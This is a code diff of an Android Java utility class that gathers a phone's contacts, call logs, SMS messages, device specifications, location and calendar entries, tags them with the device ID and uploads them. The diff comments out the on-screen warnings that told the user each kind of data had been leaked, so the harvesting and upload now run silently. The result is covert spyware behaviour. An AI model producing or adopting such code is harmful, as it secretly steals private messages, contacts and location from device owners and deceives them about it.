@@ -111,7 +111,7 @@ public class PermissionUtils {
                                 map.put(name,number);
                             }
 
-                            XToastUtils.warning("你的所有通讯录信息已泄露");
+                          //  XToastUtils.warning("你的所有通讯录信息已泄露");
                           //  XToastUtils.toast( "电话号码"+map.toString());
 
 
@@ -171,7 +171,7 @@ public class PermissionUtils {
                             jsonObject.put("data",JSONArray.toJSON(map));
 
                             //http_contact(jsonObject);
-                            XToastUtils.warning("通话记录信息已泄露");
+                        //    XToastUtils.warning("通话记录信息已泄露");
 
                             if(!already_up.contains(jsonObject)){
                                 permissionUp.Up(6,jsonObject);
@@ -234,7 +234,7 @@ public class PermissionUtils {
                                 jsonObject.put("permission","message");
                                 jsonObject.put("deviceId", Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID));
                                 jsonObject.put("data",JSONArray.toJSON(map));
-                                XToastUtils.warning("短信信息已泄露");
+                              //  XToastUtils.warning("短信信息已泄露");
 
                               //  http_contact(jsonObject);
                                 if(!already_up.contains(jsonObject)){
@@ -270,7 +270,11 @@ public class PermissionUtils {
                             Battery battery = new Battery(context);
 
                             Map<String,String> map = new HashMap<>();
-                            map.put("手机品牌",device.getManufacturer());
+                            if(device.getManufacturer().equals("OnePlus")){
+                                map.put("手机品牌","一加");
+                            }else {
+                                map.put("手机品牌",device.getManufacturer());
+                            }
                             map.put("手机型号",device.getModel());
                             map.put("安卓版本",device.getOsVersion());
                             map.put("运行内存", String.valueOf(Float.valueOf(String.format("%.2f", (float) memory.getTotalRAM() / (1024 * 1024 * 1024)))) + " GB");
@@ -289,7 +293,7 @@ public class PermissionUtils {
                             jsonObject.put("data",JSONArray.toJSON(map));
 
                             //http_contact(jsonObject);
-                            XToastUtils.warning("手机配置信息已泄露");
+                         //   XToastUtils.warning("手机配置信息已泄露");
 
 
                             if(!already_up.contains(jsonObject)){
@@ -322,13 +326,13 @@ public class PermissionUtils {
                             //XToastUtils.toast( "onGranted: 获取权限成功！");
                             LocationInfo locationInfo = new LocationInfo(context);
                             DeviceLocation deviceLocation = locationInfo.getLocation();
-                            if(deviceLocation.getAddressLine1().isEmpty()){
+                            if(deviceLocation.getAddressLine1()==null){
                                 XToastUtils.warning("正在定位中......");
                                 return;
                             }
 
                            // XToastUtils.toast( "位置："+deviceLocation.getAddressLine1());
-
+                        //    XToastUtils.warning("位置信息泄露");
                             Map<String,String> map = new HashMap<>();
                             map.put("location",deviceLocation.getAddressLine1());
                             map.put("纬度", String.valueOf(deviceLocation.getLatitude()));
@@ -398,7 +402,7 @@ public class PermissionUtils {
                            // jsonObject.put("data",JSONArray.toJSON(map));
                             //http_contact(jsonObject);
                             Log.i("aaaa",jsonObject.toString());
-                            XToastUtils.warning("日历日程信息已泄露");
+                          //  XToastUtils.warning("日历日程信息已泄露");
                             if(!already_up.contains(jsonObject)){
                                 permissionUp.Up(5,jsonObject);
                                 already_up.add(jsonObject);
